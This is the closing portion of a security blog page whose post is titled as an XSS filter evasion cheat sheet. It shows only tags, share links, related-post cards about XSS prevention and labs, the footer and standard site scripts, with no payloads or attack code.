</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/10cyberattack/'>10CyberAttack</a>, <a href='/categories/xss/'>XSS</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cyberattack/" class="post-tag no-text-decoration" >CyberAttack</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >XSS</a> <a href="/tags/cheatsheet/" class="post-tag no-text-decoration" >CheatSheet</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Meow's CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet - Grace&url=https://ocholuo.github.io//posts/XSS-Filter-Evasion-Cheat-Sheet/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Meow's CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet - Grace&u=https://ocholuo.github.io//posts/XSS-Filter-Evasion-Cheat-Sheet/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Meow's CyberAttack - Cross Site Scripting Filter Evasion Cheat Sheet - Grace&url=https://ocholuo.github.io//posts/XSS-Filter-Evasion-Cheat-Sheet/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/XSS-Prevention-Cheat-Sheet/"><div class="card-body"> <span class="timeago small" >Sep 19, 2020<i class="unloaded">2020-09-19T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Meow's CyberAttack - Cross Site Scripting Prevention Cheat Sheet</h3><div class="text-muted small"><p> [toc] Cross Site Scripting Prevention Cheat Sheet Introduction Both reflected and stored XSS can be addressed by performing the appropriate validation and encoding on the server-side. D...</p></div></div></a></div><div class="card"> <a href="/posts/XSS/"><div class="card-body"> <span class="timeago small" >Sep 19, 2020<i class="unloaded">2020-09-19T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Meow's CyberAttack - Cross Site Scripting</h3><div class="text-muted small"><p> [toc] Meow’s CyberAttack - Cross Site Scripting 跨站脚本 Part One: Overview web application vulnerability 是代码注入的一种。 将代码注入到网页上，其他用户在观看网页时就会受到影响。 the basics of this a...</p></div></div></a></div><div class="card"> <a href="/posts/SEED-Labs-CrossSiteScripting-Attack-Lab/"><div class="card-body"> <span class="timeago small" >Aug 20, 2020<i class="unloaded">2020-08-20T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SEED Labs – Cross-Site Scripting Attack Lab</h3><div class="text-muted small"><p> SEED Labs – Cross-Site Scripting Attack Lab [toc] Brief The tasks are based on a web application called ELGG which is open source. The prebuilt vm called seedubuntu is used to host the web...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Scripts-Injection/" class="btn btn-outline-primary" prompt="Older"><p>Scripts injection</p></a> <a href="/posts/XSS-Prevention-Cheat-Sheet/" class="btn btn-outline-primary" prompt="Newer"><p>Meow's CyberAttack - Cross Site Scripting Prevention Cheat Sheet</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
